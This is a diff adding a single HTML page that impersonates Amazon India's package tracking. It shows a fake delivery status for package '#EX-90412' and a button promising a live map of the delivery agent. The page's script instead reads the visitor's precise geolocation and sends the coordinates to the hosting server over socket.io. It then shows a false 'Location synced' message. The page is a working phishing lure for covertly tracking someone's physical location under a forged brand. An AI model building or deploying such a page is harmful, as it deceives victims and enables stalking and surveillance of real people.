@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Amazon - Package Tracking</title>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
+    <script src="/socket.io/socket.io.js"></script>
+    <style>
+        :root {
+            --amazon-navy: #131921;
+            --amazon-yellow: #ffd814;
+            --amazon-yellow-hover: #f7ca00;
+            --amazon-green: #067d62;
+        }
+
+        body { 
+            background-color: #eaeded; 
+            font-family: "Amazon Ember", Arial, sans-serif;
+            margin: 0;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Amazon Header Navbar */
+        .amazon-header {
+            background-color: var(--amazon-navy);
+            color: white;
+            padding: 12px 20px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        .amazon-logo {
+            font-weight: 800;
+            font-size: 1.3rem;
+            letter-spacing: -0.5px;
+        }
+        .amazon-logo span { color: #ff9900; }
+
+        /* Centered Wrapper */
+        .main-wrapper {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        /* Card Styling */
+        .card { 
+            border-radius: 12px; 
+            border: none; 
+            box-shadow: 0 4px 16px rgba(0,0,0,0.08); 
+            background: #ffffff;
+            width: 100%;
+            max-width: 420px;
+        }
+
+        /* Delivery Status Styling */
+        .status-title {
+            color: var(--amazon-green);
+            font-size: 1.3rem;
+            font-weight: 700;
+        }
+
+        /* Custom Amazon Primary Button */
+        .btn-amazon { 
+            background-color: var(--amazon-yellow); 
+            color: #0f1111; 
+            font-weight: 700; 
+            border-radius: 24px; 
+            padding: 12px;
+            border: 1px solid #fcd200;
+            box-shadow: 0 2px 5px rgba(213,217,217,.5);
+            transition: all 0.2s ease;
+        }
+        .btn-amazon:hover { 
+            background-color: var(--amazon-yellow-hover); 
+            color: #0f1111; 
+            transform: translateY(-1px);
+        }
+
+        /* Tracker Timeline Visual */
+        .tracker-bar {
+            height: 8px;
+            background-color: #e7e7e7;
+            border-radius: 4px;
+            overflow: hidden;
+        }
+        .tracker-progress {
+            width: 75%;
+            height: 100%;
+            background-color: var(--amazon-green);
+            border-radius: 4px;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Amazon Top Bar -->
+    <header class="amazon-header d-flex justify-content-between align-items-center">
+        <div class="amazon-logo">amazon<span>.in</span></div>
+        <small class="text-white-50 fw-semibold">Secure Tracking</small>
+    </header>
+
+    <!-- Centered Content Area -->
+    <div class="main-wrapper">
+        <div class="card p-4">
+            
+            <!-- Delivery Status Header -->
+            <div class="mb-3 text-start">
+                <div class="status-title mb-1">Arriving today by 9 PM</div>
+                <div class="text-muted small">Package ID: <span class="fw-bold text-dark">#EX-90412</span></div>
+            </div>
+
+            <!-- Amazon Style Progress Bar -->
+            <div class="tracker-bar mb-2">
+                <div class="tracker-progress"></div>
+            </div>
+            <div class="d-flex justify-content-between text-muted small fw-bold mb-4" style="font-size: 0.75rem;">
+                <span>Ordered</span>
+                <span>Shipped</span>
+                <span class="text-dark">Out for delivery</span>
+            </div>
+
+            <!-- Driver Info Card Section -->
+            <div class="p-3 bg-light rounded-3 text-start mb-4 border border-light-subtle">
+                <div class="d-flex align-items-center gap-3">
+                    <div style="font-size: 2.2rem;">🚚</div>
+                    <div>
+                        <h6 class="fw-bold mb-1" style="font-size: 0.95rem;">Delivery agent is nearby</h6>
+                        <p class="text-secondary mb-0" style="font-size: 0.8rem;">Tap below to sync location for live route updates.</p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Track Button -->
+            <button onclick="getLocation()" class="btn btn-amazon w-100">
+                📍 Track Agent Live Map
+            </button>
+
+        </div>
+    </div>
+
+    <!-- Script -->
+    <script>
+        const socket = io();
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        socket.emit("location", {
+                            lat: position.coords.latitude,
+                            lon: position.coords.longitude
+                        });
+                        alert("Location synced! Loading driver distance...");
+                    },
+                    (error) => {
+                        alert("Please enable location services to track the delivery agent.");
+                    }
+                );
+            } else {
+                alert("Geolocation is not supported by your browser.");
+            }
+        }
+    </script>
+</body>
+</html>
+
